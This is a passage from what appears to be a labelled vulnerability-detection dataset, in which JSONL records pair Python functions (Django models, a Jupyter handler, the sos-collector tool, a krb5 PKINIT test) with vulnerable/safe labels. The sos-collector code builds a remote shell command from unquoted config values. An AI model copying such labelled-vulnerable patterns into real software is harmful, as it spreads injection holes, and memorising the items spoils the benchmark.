#23934\nclass ExplicitlyProvidedPK(models.Model):\n    name = models.IntegerField(primary_key=True)\n\n\nclass ImplicitlyGeneratedPK(models.Model):\n    name = models.IntegerField(unique=True)\n\n\n# Models for #25622\nclass ReferencedByGenRel(models.Model):\n    content_type = models.ForeignKey(ContentType, on_delete=models.CASCADE)\n    object_id = models.PositiveIntegerField()\n    content_object = GenericForeignKey('content_type', 'object_id')\n\n\nclass GenRelReference(models.Model):\n    references = GenericRelation(ReferencedByGenRel)\n\n\nclass ParentWithUUIDPK(models.Model):\n    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)\n    title = models.CharField(max_length=100)\n\n    def __str__(self):\n        return str(self.id)\n\n\nclass RelatedWithUUIDPKModel(models.Model):\n    parent = models.ForeignKey(ParentWithUUIDPK, on_delete=models.CASCADE)\n", "target": 1}
{"idx": 1034, "func": "import json\n\nfrom tornado import web\n\nfrom ...base.handlers import APIHandler, json_errors\n\nclass NbconvertRootHandler(APIHandler):\n    SUPPORTED_METHODS = ('GET',)\n\n    @web.authenticated\n    @json_errors\n    def get(self):\n        try:\n            from IPython.nbconvert.exporters.export import exporter_map\n        except ImportError as e:\n            raise web.HTTPError(500, \"Could not import nbconvert: %s\" % e)\n        res = {}\n        for format, exporter in exporter_map.items():\n            res[format] = info = {}\n            info['output_mimetype'] = exporter.output_mimetype\n\n        self.finish(json.dumps(res))\n\ndefault_handlers = [\n    (r\"/api/nbconvert\", NbconvertRootHandler),\n]", "target": 0}
{"idx": 1035, "func": "# Copyright Red Hat 2017, Jake Hunsaker <jhunsake@redhat.com>\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n\n# You should have received a copy of the GNU General Public License along\n# with this program; if not, write to the Free Software Foundation, Inc.,\n# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n\nimport fnmatch\nimport inspect\nimport logging\nimport os\nimport random\nimport re\nimport string\nimport tarfile\nimport threading\nimport tempfile\nimport shutil\nimport subprocess\nimport sys\n\nfrom datetime import datetime\nfrom concurrent.futures import ThreadPoolExecutor\nfrom .sosnode import SosNode\nfrom distutils.sysconfig import get_python_lib\nfrom getpass import getpass\nfrom six.moves import input\nfrom textwrap import fill\nfrom soscollector import __version__\n\n\nclass SosCollector():\n    '''Main sos-collector class'''\n\n    def __init__(self, config):\n        self.config = config\n        self.threads = []\n        self.workers = []\n        self.client_list = []\n        self.node_list = []\n        self.master = False\n        self.retrieved = 0\n        self.need_local_sudo = False\n        if not self.config['list_options']:\n            try:\n                if not self.config['tmp_dir']:\n                    self.create_tmp_dir()\n                self._setup_logging()\n                self.log_debug('Executing %s' % ' '.join(s for s in sys.argv))\n                self._load_clusters()\n                self._parse_options()\n                self.prep()\n            except KeyboardInterrupt:\n                self._exit('Exiting on user cancel', 130)\n        else:\n            self._load_clusters()\n\n    def _setup_logging(self):\n        # behind the scenes logging\n        self.logger = logging.getLogger('sos_collector')\n        self.logger.setLevel(logging.DEBUG)\n        self.logfile = tempfile.NamedTemporaryFile(\n            mode=\"w+\",\n            dir=self.config['tmp_dir'])\n        hndlr = logging.StreamHandler(self.logfile)\n        hndlr.setFormatter(logging.Formatter(\n            '%(asctime)s %(levelname)s: %(message)s'))\n        hndlr.setLevel(logging.DEBUG)\n        self.logger.addHandler(hndlr)\n\n        console = logging.StreamHandler(sys.stderr)\n        console.setFormatter(logging.Formatter('%(message)s'))\n\n        # ui logging\n        self.console = logging.getLogger('sos_collector_console')\n        self.console.setLevel(logging.DEBUG)\n        self.console_log_file = tempfile.NamedTemporaryFile(\n            mode=\"w+\",\n            dir=self.config['tmp_dir'])\n        chandler = logging.StreamHandler(self.console_log_file)\n        cfmt = logging.Formatter('%(asctime)s %(levelname)s: %(message)s')\n        chandler.setFormatter(cfmt)\n        self.console.addHandler(chandler)\n\n        # also print to console\n        ui = logging.StreamHandler()\n        fmt = logging.Formatter('%(message)s')\n        ui.setFormatter(fmt)\n        if self.config['verbose']:\n            ui.setLevel(logging.DEBUG)\n        else:\n            ui.setLevel(logging.INFO)\n        self.console.addHandler(ui)\n\n    def _exit(self, msg, error=1):\n        '''Used to safely terminate if sos-collector encounters an error'''\n        self.log_error(msg)\n        try:\n            self.close_all_connections()\n        except Exception:\n            pass\n        sys.exit(error)\n\n    def _parse_options(self):\n        '''If there are cluster options set on the CLI, override the defaults\n        '''\n        if self.config['cluster_options']:\n            for opt in self.config['cluster_options']:\n                match = False\n                for option in self.clusters[opt.cluster].options:\n                    if opt.name == option.name:\n                        match = True\n                        # override the default from CLI\n                        option.value = self._validate_option(option, opt)\n                if not match:\n                    self._exit('Unknown option provided: %s.%s' % (\n                        opt.cluster, opt.name\n                    ))\n\n    def _validate_option(self, default, cli):\n        '''Checks to make sure that the option given on the CLI is valid.\n        Valid in this sense means that the type of value given matches what a\n        cluster profile expects (str for str, bool for bool, etc).\n\n        For bool options, this will also convert the string equivalent to an\n        actual boolean value\n        '''\n        if not default.opt_type == bool:\n            if not default.opt_type == cli.opt_type:\n                msg = \"Invalid option type for %s. Expected %s got %s\"\n                self._exit(msg % (cli.name, default.opt_type, cli.opt_type))\n            return cli.value\n        else:\n            val = cli.value.lower()\n            if val not in ['true', 'on', 'false', 'off']:\n                msg = (\"Invalid value for %s. Accepted values are: 'true', \"\n                       \"'false', 'on', 'off'\")\n                self._exit(msg % cli.name)\n            else:\n                if val in ['true', 'on']:\n                    return True\n                else:\n                    return False\n\n    def log_info(self, msg):\n        '''Log info messages to both console and log file'''\n        self.logger.info(msg)\n        self.console.info(msg)\n\n    def log_error(self, msg):\n        '''Log error messages to both console and log file'''\n        self.logger.error(msg)\n        self.console.error(msg)\n\n    def log_debug(self, msg):\n        '''Log debug message to both console and log file'''\n        caller = inspect.stack()[1][3]\n        msg = '[sos_collector:%s] %s' % (caller, msg)\n        self.logger.debug(msg)\n        if self.config['verbose']:\n            self.console.debug(msg)\n\n    def create_tmp_dir(self):\n        '''Creates a temp directory to transfer sosreports to'''\n        tmpdir = tempfile.mkdtemp(prefix='sos-collector-', dir='/var/tmp')\n        self.config['tmp_dir'] = tmpdir\n        self.config['tmp_dir_created'] = True\n\n    def list_options(self):\n        '''Display options for available clusters'''\n        print('\\nThe following cluster options are available:\\n')\n        print('{:15} {:15} {:<10} {:10} {:<}'.format(\n            'Cluster',\n            'Option Name',\n            'Type',\n            'Default',\n            'Description'\n        ))\n\n        for cluster in self.clusters:\n            for opt in self.clusters[cluster].options:\n                optln = '{:15} {:15} {:<10} {:<10} {:<10}'.format(\n                    opt.cluster,\n                    opt.name,\n                    opt.opt_type.__name__,\n                    str(opt.value),\n                    opt.description\n                )\n                print(optln)\n        print('\\nOptions take the form of cluster.name=value'\n              '\\nE.G. \"ovirt.no-database=True\" or \"pacemaker.offline=False\"')\n\n    def delete_tmp_dir(self):\n        '''Removes the temp directory and all collected sosreports'''\n        shutil.rmtree(self.config['tmp_dir'])\n\n    def _load_clusters(self):\n        '''Load an instance of each cluster so that sos-collector can later\n        determine what type of cluster is in use\n        '''\n        if 'soscollector' not in os.listdir(os.getcwd()):\n            p = get_python_lib()\n            path = p + '/soscollector/clusters/'\n        else:\n            path = 'soscollector/clusters'\n        self.clusters = {}\n        sys.path.insert(0, path)\n        for f in sorted(os.listdir(path)):\n            fname, ext = os.path.splitext(f)\n            if ext == '.py' and fname not in ['__init__', 'cluster']:\n                mods = inspect.getmembers(__import__(fname), inspect.isclass)\n                for cluster in mods[1:]:\n                    self.clusters[cluster[0]] = cluster[1](self.config)\n        self.log_debug('Found cluster profiles: %s'\n                       % list(self.clusters.keys()))\n        sys.path.pop(0)\n\n    def _get_archive_name(self):\n        '''Generates a name for the tarball archive'''\n        nstr = 'sos-collector'\n        if self.config['label']:\n            nstr += '-%s' % self.config['label']\n        if self.config['case_id']:\n            nstr += '-%s' % self.config['case_id']\n        dt = datetime.strftime(datetime.now(), '%Y-%m-%d')\n\n        try:\n            string.lowercase = string.ascii_lowercase\n        except NameError:\n            pass\n\n        rand = ''.join(random.choice(string.lowercase) for x in range(5))\n        return '%s-%s-%s' % (nstr, dt, rand)\n\n    def _get_archive_path(self):\n        '''Returns the path, including filename, of the tarball we build\n        that contains the collected sosreports\n        '''\n        self.arc_name = self._get_archive_name()\n        compr = 'gz'\n        return self.config['out_dir'] + self.arc_name + '.tar.' + compr\n\n    def _fmt_msg(self, msg):\n        width = 80\n        _fmt = ''\n        for line in msg.splitlines():\n            _fmt = _fmt + fill(line, width, replace_whitespace=False) + '\\n'\n        return _fmt\n\n    def prep(self):\n        '''Based on configuration, performs setup for collection'''\n        disclaimer = (\"\"\"\\\nThis utility is used to collect sosreports from multiple \\\nnodes simultaneously. It uses the python-paramiko library \\\nto manage the SSH connections to remote systems. If this \\\nlibrary is not acceptable for use in your environment, \\\nyou should not use this utility.\n\nAn archive of sosreport tarballs collected from the nodes will be \\\ngenerated in %s and may be provided to an appropriate support representative.\n\nThe generated archive may contain data considered sensitive \\\nand its content should be reviewed by the originating \\\norganization before being passed to any third party.\n\nNo configuration changes will be made to the system running \\\nthis utility or remote systems that it connects to.\n\"\"\")\n        self.console.info(\"\\nsos-collector (version %s)\\n\" % __version__)\n        intro_msg = self._fmt_msg(disclaimer % self.config['tmp_dir'])\n        self.console.info(intro_msg)\n        prompt = \"\\nPress ENTER to continue, or CTRL-C to quit\\n\"\n        if not self.config['batch']:\n            input(prompt)\n\n        if not self.config['password']:\n            self.log_debug('password not specified, assuming SSH keys')\n            msg = ('sos-collector ASSUMES that SSH keys are installed on all '\n                   'nodes unless the --password option is provided.\\n')\n            self.console.info(self._fmt_msg(msg))\n\n        if self.config['password']:\n            self.log_debug('password specified, not using SSH keys')\n            msg = ('Provide the SSH password for user %s: '\n                   % self.config['ssh_user'])\n            self.config['password'] = getpass(prompt=msg)\n\n        if self.config['need_sudo'] and not self.config['insecure_sudo']:\n            if not self.config['password']:\n                self.log_debug('non-root user specified, will request '\n                               'sudo password')\n                msg = ('A non-root user has been provided. Provide sudo '\n                       'password for %s on remote nodes: '\n                       % self.config['ssh_user'])\n                self.config['sudo_pw'] = getpass(prompt=msg)\n            else:\n                if not self.config['insecure_sudo']:\n                    self.config['sudo_pw'] = self.config['password']\n\n        if self.config['become_root']:\n            if not self.config['ssh_user'] == 'root':\n                self.log_debug('non-root user asking to become root remotely')\n                msg = ('User %s will attempt to become root. '\n                       'Provide root password: ' % self.config['ssh_user'])\n                self.config['root_password'] = getpass(prompt=msg)\n                self.config['need_sudo'] = False\n            else:\n                self.log_info('Option to become root but ssh user is root.'\n                              ' Ignoring request to change user on node')\n                self.config['become_root'] = False\n\n        if self.config['master']:\n            self.connect_to_master()\n            self.config['no_local'] = True\n        else:\n            self.master = SosNode('localhost', self.config)\n        if self.config['cluster_type']:\n            self.config['cluster'] = self.clusters[self.config['cluster_type']]\n        else:\n            self.determine_cluster()\n        if self.config['cluster'] is None and not self.config['nodes']:\n            msg = ('Cluster type could not be determined and no nodes provided'\n                   '\\nAborting...')\n            self._exit(msg, 1)\n        self.config['cluster'].setup()\n        self.get_nodes()\n        self.intro()\n        self.configure_sos_cmd()\n\n    def intro(self):\n        '''Prints initial messages and collects user and case if not\n        provided already.\n        '''\n        self.console.info('')\n\n        if not self.node_list and not self.master.connected:\n            self._exit('No nodes were detected, or nodes do not have sos '\n                       'installed.\\nAborting...')\n\n        self.console.info('The following is a list of nodes to collect from:')\n        if self.master.connected:\n            self.console.info('\\t%-*s' % (self.config['hostlen'],\n                                          self.config['master']))\n\n        for node in sorted(self.node_list):\n            self.console.info(\"\\t%-*s\" % (self.config['hostlen'], node))\n\n        self.console.info('')\n\n        if not self.config['case_id'] and not self.config['batch']:\n            msg = 'Please enter the case id you are collecting reports for: '\n            self.config['case_id'] = input(msg)\n\n    def configure_sos_cmd(self):\n        '''Configures the sosreport command that is run on the nodes'''\n        if self.config['sos_opt_line']:\n            self.config['sos_cmd'] += self.config['sos_opt_line']\n            self.log_debug(\"User specified manual sosreport command line. \"\n                           \"sos command set to %s\" % self.config['sos_cmd'])\n            return True\n        if self.config['case_id']:\n            self.config['sos_cmd'] += ' --case-id=%s' % self.config['case_id']\n        if self.config['alloptions']:\n            self.config['sos_cmd'] += ' --alloptions'\n        if self.config['verify']:\n            self.config['sos_cmd'] += ' --verify'\n        if self.config['log_size']:\n            self.config['sos_cmd'] += (' --log-size=%s'\n                                       % self.config['log_size'])\n        if self.config['sysroot']:\n            self.config['sos_cmd'] += ' -s %s' % self.config['sysroot']\n        if self.config['chroot']:\n            self.config['sos_cmd'] += ' -c %s' % self.config['chroot']\n        if self.config['compression']:\n            self.config['sos_cmd'] += ' -z %s' % self.config['compression']\n        if self.config['cluster_type']:\n            self.config['cluster'].modify_sos_cmd()\n        self.log_debug('Initial sos cmd set to %s' % self.config['sos_cmd'])\n\n    def connect_to_master(self):\n        '''If run with --master, we will run cluster checks again that\n        instead of the localhost.\n        '''\n        try:\n            self.master = SosNode(self.config['master'], self.config)\n        except Exception as e:\n            self.log_debug('Failed to connect to master: %s' % e)\n            self._exit('Could not connect to master node.\\nAborting...', 1)\n\n    def determine_cluster(self):\n        '''This sets the cluster type and loads that cluster's cluster.\n\n        If no cluster type is matched and no list of nodes is provided by\n        the user, then we abort.\n\n        If a list of nodes is given, this is not run, however the cluster\n        can still be run if the user sets a --cluster-type manually\n        '''\n\n        for clus in self.clusters:\n            self.clusters[clus].master = self.master\n            if self.clusters[clus].check_enabled():\n                self.config['cluster'] = self.clusters[clus]\n                name = str(self.clusters[clus].__class__.__name__).lower()\n                self.config['cluster_type'] = name\n                self.log_info(\n                    'Cluster type set to %s' % self.config['cluster_type'])\n                break\n\n    def get_nodes_from_cluster(self):\n        '''Collects the list of nodes from the determined cluster cluster'''\n        nodes = self.config['cluster']._get_nodes()\n        self.log_debug('Node list: %s' % nodes)\n        return nodes\n\n    def reduce_node_list(self):\n        '''Reduce duplicate entries of the localhost and/or master node\n        if applicable'''\n        if (self.config['hostname'] in self.node_list and\n                self.config['no_local']):\n            self.node_list.remove(self.config['hostname'])\n        for i in self.config['ip_addrs']:\n            if i in self.node_list:\n                self.node_list.remove(i)\n        # remove the master node from the list, since we already have\n        # an open session to it.\n        if self.config['master']:\n            for n in self.node_list:\n                if n == self.master.hostname or n == self.config['master']:\n                    self.node_list.remove(n)\n        self.node_list = list(set(n for n in self.node_list if n))\n        self.log_debug('Node list reduced to %s' % self.node_list)\n\n    def compare_node_to_regex(self, node):\n        '''Compares a discovered node name to a provided list of nodes from\n        the user. If there is not a match, the node is removed from the list'''\n        for regex in self.config['nodes']:\n            try:\n                if re.match(regex, node):\n                    return True\n            except re.error as err:\n                msg = 'Error comparing %s to provided node regex %s: %s'\n                self.log_debug(msg % (node, regex, err))\n        return False\n\n    def get_nodes(self):\n        ''' Sets the list of nodes to collect sosreports from '''\n        if not self.config['master'] and not self.config['cluster']:\n            msg = ('Could not determine a cluster type and no list of '\n                   'nodes or master node was provided.\\nAborting...'\n                   )\n            self._exit(msg)\n\n        try:\n            nodes = self.get_nodes_from_cluster()\n            if self.config['nodes']:\n                for node in nodes:\n                    if self.compare_node_to_regex(node):\n                        self.node_list.append(node)\n            else:\n                self.node_list = nodes\n        except Exception as e:\n            self.log_debug(\"Error parsing node list: %s\" % e)\n            self.log_debug('Setting node list to --nodes option')\n            self.node_list = self.config['nodes']\n            for node in self.node_list:\n                if any(i in node for i in ('*', '\\\\', '?', '(', ')', '/')):\n                    self.node_list.remove(node)\n\n        # force add any non-regex node strings from nodes option\n        if self.config['nodes']:\n            for node in self.config['nodes']:\n                if any(i in node for i in ('*', '\\\\', '?', '(', ')', '/')):\n                    continue\n                if node not in self.node_list:\n                    self.log_debug(\"Force adding %s to node list\" % node)\n                    self.node_list.append(node)\n\n        if not self.config['master']:\n            host = self.config['hostname'].split('.')[0]\n            # trust the local hostname before the node report from cluster\n            for node in self.node_list:\n                if host == node.split('.')[0]:\n                    self.node_list.remove(node)\n            self.node_list.append(self.config['hostname'])\n        self.reduce_node_list()\n        try:\n            self.config['hostlen'] = len(max(self.node_list, key=len))\n        except (TypeError, ValueError):\n            self.config['hostlen'] = len(self.config['master'])\n\n    def can_run_local_sos(self):\n        '''Check if sosreport can be run as the current user, or if we need\n        to invoke sudo'''\n        if os.geteuid() != 0:\n            self.log_debug('Not running as root. Need sudo for local sos')\n            self.need_local_sudo = True\n            msg = ('\\nLocal sosreport requires root. Provide sudo password'\n                   'or press ENTER to skip: ')\n            self.local_sudopw = getpass(prompt=msg)\n            self.console.info('\\n')\n            if not self.local_sudopw:\n                self.logger.info('Will not collect local sos, no password')\n                return False\n        self.log_debug('Able to collect local sos')\n        return True\n\n    def _connect_to_node(self, node):\n        '''Try to connect to the node, and if we can add to the client list to\n        run sosreport on\n        '''\n        try:\n            client = SosNode(node, self.config)\n            if client.connected:\n                self.client_list.append(client)\n            else:\n                client.close_ssh_session()\n        except Exception:\n            pass\n\n    def collect(self):\n        ''' For each node, start a collection thread and then tar all\n        collected sosreports '''\n        if self.master.connected:\n            self.client_list.append(self.master)\n        self.console.info(\"\\nConnecting to nodes...\")\n        filters = [self.master.address, self.master.hostname]\n        nodes = [n for n in self.node_list if n not in filters]\n\n        try:\n            pool = ThreadPoolExecutor(self.config['threads'])\n            pool.map(self._connect_to_node, nodes, chunksize=1)\n            pool.shutdown(wait=True)\n\n            self.report_num = len(self.client_list)\n\n            self.console.info(\"\\nBeginning collection of sosreports from %s \"\n                              \"nodes, collecting a maximum of %s \"\n                              \"concurrently\\n\"\n                              % (len(self.client_list), self.config['threads'])\n                              )\n\n            pool = ThreadPoolExecutor(self.config['threads'])\n            pool.map(self._collect, self.client_list, chunksize=1)\n            pool.shutdown(wait=True)\n        except KeyboardInterrupt:\n            self.log_error('Exiting on user cancel\\n')\n            os._exit(130)\n\n        if hasattr(self.config['cluster'], 'run_extra_cmd'):\n            self.console.info('Collecting additional data from master node...')\n            f = self.config['cluster'].run_extra_cmd()\n            if f:\n                self.master.collect_extra_cmd(f)\n        msg = '\\nSuccessfully captured %s of %s sosreports'\n        self.log_info(msg % (self.retrieved, self.report_num))\n        if self.retrieved > 0:\n            self.create_cluster_archive()\n        else:\n            msg = 'No sosreports were collected, nothing to archive...'\n            self._exit(msg, 1)\n        self.close_all_connections()\n\n    def _collect(self, client):\n        '''Runs sosreport on each node'''\n        if not client.local:\n            client.sosreport()\n        else:\n            if not self.config['no_local']:\n                client.sosreport()\n        if client.retrieved:\n            self.retrieved += 1\n\n    def close_all_connections(self):\n        '''Close all ssh sessions for nodes'''\n        for client in self.client_list:\n            self.log_debug('Closing SSH connection to %s' % client.address)\n            client.close_ssh_session()\n\n    def create_cluster_archive(self):\n        '''Calls for creation of tar archive then cleans up the temporary\n        files created by sos-collector'''\n        self.log_info('Creating archive of sosreports...')\n        self.create_sos_archive()\n        if self.archive:\n            self.logger.info('Archive created as %s' % self.archive)\n            self.cleanup()\n            self.console.info('\\nThe following archive has been created. '\n                              'Please provide it to your support team.')\n            self.console.info('    %s' % self.archive)\n\n    def create_sos_archive(self):\n        '''Creates a tar archive containing all collected sosreports'''\n        try:\n            self.archive = self._get_archive_path()\n            with tarfile.open(self.archive, \"w:gz\") as tar:\n                for fname in os.listdir(self.config['tmp_dir']):\n                    arcname = fname\n                    if fname == self.logfile.name.split('/')[-1]:\n                        arcname = 'sos-collector.log'\n                    if fname == self.console_log_file.name.split('/')[-1]:\n                        arcname = 'ui.log'\n                    tar.add(os.path.join(self.config['tmp_dir'], fname),\n                            arcname=self.arc_name + '/' + arcname)\n                tar.close()\n        except Exception as e:\n            msg = 'Could not create archive: %s' % e\n            self._exit(msg, 2)\n\n    def cleanup(self):\n        ''' Removes the tmp dir and all sosarchives therein.\n\n            If tmp dir was supplied by user, only the sos archives within\n            that dir are removed.\n        '''\n        if self.config['tmp_dir_created']:\n            self.delete_tmp_dir()\n        else:\n            for f in os.listdir(self.config['tmp_dir']):\n                if re.search('*sosreport-*tar*', f):\n                    os.remove(os.path.join(self.config['tmp_dir'], f))\n", "target": 1}
{"idx": 1036, "func": "#!/usr/bin/python\nfrom k5test import *\n\n# Skip this test if pkinit wasn't built.\nif not os.path.exists(os.path.join(plugins, 'preauth', 'pkinit.so')):\n    skip_rest('PKINIT tests', 'PKINIT module not built')\n\n# Check if soft-pkcs11.so is available.\ntry:\n    import ctypes\n    lib = ctypes.LibraryLoader(ctypes.CDLL).LoadLibrary('soft-pkcs11.so')\n    del lib\n    have_soft_pkcs11 = True\nexcept:\n    have_soft_pkcs11 = False\n\n# Construct a krb5.conf fragment configuring pkinit.\ncerts = os.path.join(srctop, 'tests', 'dejagnu', 'pkinit-certs')\nca_pem = os.path.join(certs, 'ca.pem')\nkdc_pem = os.path.join(certs, 'kdc.pem')\nuser_pem = os.path.join(certs, 'user.pem')\nprivkey_pem = os.path.join(certs, 'privkey.pem')\nprivkey_enc_pem = os.path.join(certs, 'privkey-enc.pem')\nuser_p12 = os.path.join(certs, 'user.p12')\nuser_enc_p12 = os.path.join(certs, 'user-enc.p12')\npath = os.path.join(os.getcwd(), 'testdir', 'tmp-pkinit-certs')\npath_enc = os.path.join(os.getcwd(), 'testdir', 'tmp-pkinit-certs-enc')\n\npkinit_krb5_conf = {'realms': {'$realm': {\n            'pkinit_anchors': 'FILE:%s' % ca_pem}}}\npkinit_kdc_conf = {'realms': {'$realm': {\n            'default_principal_flags': '+preauth',\n            'pkinit_eku_checking': 'none',\n            'pkinit_identity': 'FILE:%s,%s' % (kdc_pem, privkey_pem),\n            'pkinit_indicator': ['indpkinit1', 'indpkinit2']}}}\nrestrictive_kdc_conf = {'realms': {'$realm': {\n            'restrict_anonymous_to_tgt': 'true' }}}\n\nfile_identity = 'FILE:%s,%s' % (user_pem, privkey_pem)\nfile_enc_identity = 'FILE:%s,%s' % (user_pem, privkey_enc_pem)\ndir_identity = 'DIR:%s' % path\ndir_enc_identity = 'DIR:%s' % path_enc\ndir_file_identity = 'FILE:%s,%s' % (os.path.join(path, 'user.crt'),\n                                    os.path.join(path, 'user.key'))\ndir_file_enc_identity = 'FILE:%s,%s' % (os.path.join(path_enc, 'user.crt'),\n                                        os.path.join(path_enc, 'user.key'))\np12_identity = 'PKCS12:%s' % user_p12\np12_enc_identity = 'PKCS12:%s' % user_enc_p12\np11_identity = 'PKCS11:soft-pkcs11.so'\np11_token_identity = ('PKCS11:module_name=soft-pkcs11.so:'\n                      'slotid=1:token=SoftToken (token)')\n\nrealm = K5Realm(krb5_conf=pkinit_krb5_conf, kdc_conf=pkinit_kdc_conf,\n                get_creds=False)\n\n# Sanity check - password-based preauth should still work.\nrealm.run(['./responder', '-r', 'password=%s' % password('user'),\n           realm.user_princ])\nrealm.kinit(realm.user_princ, password=password('user'))\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\n\n# Test anonymous PKINIT.\nout = realm.kinit('@%s' % realm.realm, flags=['-n'], expected_code=1)\nif 'not found in Kerberos database' not in out:\n    fail('Wrong error for anonymous PKINIT without anonymous enabled')\nrealm.addprinc('WELLKNOWN/ANONYMOUS')\nrealm.kinit('@%s' % realm.realm, flags=['-n'])\nrealm.klist('WELLKNOWN/ANONYMOUS@WELLKNOWN:ANONYMOUS')\nrealm.run([kvno, realm.host_princ])\nout = realm.run(['./adata', realm.host_princ])\nif '97:' in out:\n    fail('auth indicators seen in anonymous PKINIT ticket')\n\n# Test anonymous kadmin.\nf = open(os.path.join(realm.testdir, 'acl'), 'a')\nf.write('WELLKNOWN/ANONYMOUS@WELLKNOWN:ANONYMOUS a *')\nf.close()\nrealm.start_kadmind()\nrealm.run([kadmin, '-n', 'addprinc', '-pw', 'test', 'testadd'])\nout = realm.run([kadmin, '-n', 'getprinc', 'testadd'], expected_code=1)\nif \"Operation requires ``get'' privilege\" not in out:\n    fail('Anonymous kadmin has too much privilege')\nrealm.stop_kadmind()\n\n# Test with anonymous restricted; FAST should work but kvno should fail.\nr_env = realm.special_env('restrict', True, kdc_conf=restrictive_kdc_conf)\nrealm.stop_kdc()\nrealm.start_kdc(env=r_env)\nrealm.kinit('@%s' % realm.realm, flags=['-n'])\nrealm.kinit('@%s' % realm.realm, flags=['-n', '-T', realm.ccache])\nout = realm.run([kvno, realm.host_princ], expected_code=1)\nif 'KDC policy rejects request' not in out:\n    fail('Wrong error for restricted anonymous PKINIT')\n\n# Regression test for #8458: S4U2Self requests crash the KDC if\n# anonymous is restricted.\nrealm.kinit(realm.host_princ, flags=['-k'])\nrealm.run([kvno, '-U', 'user', realm.host_princ])\n\n# Go back to a normal KDC and disable anonymous PKINIT.\nrealm.stop_kdc()\nrealm.start_kdc()\nrealm.run([kadminl, 'delprinc', 'WELLKNOWN/ANONYMOUS'])\n\n# Run the basic test - PKINIT with FILE: identity, with no password on the key.\nrealm.run(['./responder', '-x', 'pkinit=',\n           '-X', 'X509_user_identity=%s' % file_identity, realm.user_princ])\nrealm.kinit(realm.user_princ,\n            flags=['-X', 'X509_user_identity=%s' % file_identity])\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\n\n# Run the basic test - PKINIT with FILE: identity, with a password on the key,\n# supplied by the prompter.\n# Expect failure if the responder does nothing, and we have no prompter.\nrealm.run(['./responder', '-x', 'pkinit={\"%s\": 0}' % file_enc_identity,\n          '-X', 'X509_user_identity=%s' % file_enc_identity, realm.user_princ],\n          expected_code=2)\nrealm.kinit(realm.user_princ,\n            flags=['-X', 'X509_user_identity=%s' % file_enc_identity],\n            password='encrypted')\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\nout = realm.run(['./adata', realm.host_princ])\nif '+97: [indpkinit1, indpkinit2]' not in out:\n    fail('auth indicators not seen in PKINIT ticket')\n\n# Run the basic test - PKINIT with FILE: identity, with a password on the key,\n# supplied by the responder.\n# Supply the response in raw form.\nrealm.run(['./responder', '-x', 'pkinit={\"%s\": 0}' % file_enc_identity,\n           '-r', 'pkinit={\"%s\": \"encrypted\"}' % file_enc_identity,\n           '-X', 'X509_user_identity=%s' % file_enc_identity,\n           realm.user_princ])\n# Supply the response through the convenience API.\nrealm.run(['./responder', '-X', 'X509_user_identity=%s' % file_enc_identity,\n           '-p', '%s=%s' % (file_enc_identity, 'encrypted'), realm.user_princ])\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\n\n# PKINIT with DIR: identity, with no password on the key.\nos.mkdir(path)\nos.mkdir(path_enc)\nshutil.copy(privkey_pem, os.path.join(path, 'user.key'))\nshutil.copy(privkey_enc_pem, os.path.join(path_enc, 'user.key'))\nshutil.copy(user_pem, os.path.join(path, 'user.crt'))\nshutil.copy(user_pem, os.path.join(path_enc, 'user.crt'))\nrealm.run(['./responder', '-x', 'pkinit=', '-X',\n           'X509_user_identity=%s' % dir_identity, realm.user_princ])\nrealm.kinit(realm.user_princ,\n            flags=['-X', 'X509_user_identity=%s' % dir_identity])\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\n\n# PKINIT with DIR: identity, with a password on the key, supplied by the\n# prompter.\n# Expect failure if the responder does nothing, and we have no prompter.\nrealm.run(['./responder', '-x', 'pkinit={\"%s\": 0}' % dir_file_enc_identity,\n           '-X', 'X509_user_identity=%s' % dir_enc_identity, realm.user_princ],\n           expected_code=2)\nrealm.kinit(realm.user_princ,\n            flags=['-X', 'X509_user_identity=%s' % dir_enc_identity],\n            password='encrypted')\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\n\n# PKINIT with DIR: identity, with a password on the key, supplied by the\n# responder.\n# Supply the response in raw form.\nrealm.run(['./responder', '-x', 'pkinit={\"%s\": 0}' % dir_file_enc_identity,\n           '-r', 'pkinit={\"%s\": \"encrypted\"}' % dir_file_enc_identity,\n           '-X', 'X509_user_identity=%s' % dir_enc_identity, realm.user_princ])\n# Supply the response through the convenience API.\nrealm.run(['./responder', '-X', 'X509_user_identity=%s' % dir_enc_identity,\n           '-p', '%s=%s' % (dir_file_enc_identity, 'encrypted'),\n           realm.user_princ])\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\n\n# PKINIT with PKCS12: identity, with no password on the bundle.\nrealm.run(['./responder', '-x', 'pkinit=',\n           '-X', 'X509_user_identity=%s' % p12_identity, realm.user_princ])\nrealm.kinit(realm.user_princ,\n            flags=['-X', 'X509_user_identity=%s' % p12_identity])\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\n\n# PKINIT with PKCS12: identity, with a password on the bundle, supplied by the\n# prompter.\n# Expect failure if the responder does nothing, and we have no prompter.\nrealm.run(['./responder', '-x', 'pkinit={\"%s\": 0}' % p12_enc_identity,\n           '-X', 'X509_user_identity=%s' % p12_enc_identity, realm.user_princ],\n           expected_code=2)\nrealm.kinit(realm.user_princ,\n            flags=['-X', 'X509_user_identity=%s' % p12_enc_identity],\n            password='encrypted')\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\n\n# PKINIT with PKCS12: identity, with a password on the bundle, supplied by the\n# responder.\n# Supply the response in raw form.\nrealm.run(['./responder', '-x', 'pkinit={\"%s\": 0}' % p12_enc_identity,\n           '-r', 'pkinit={\"%s\": \"encrypted\"}' % p12_enc_identity,\n           '-X', 'X509_user_identity=%s' % p12_enc_identity, realm.user_princ])\n# Supply the response through the convenience API.\nrealm.run(['./responder', '-X', 'X509_user_identity=%s' % p12_enc_identity,\n           '-p', 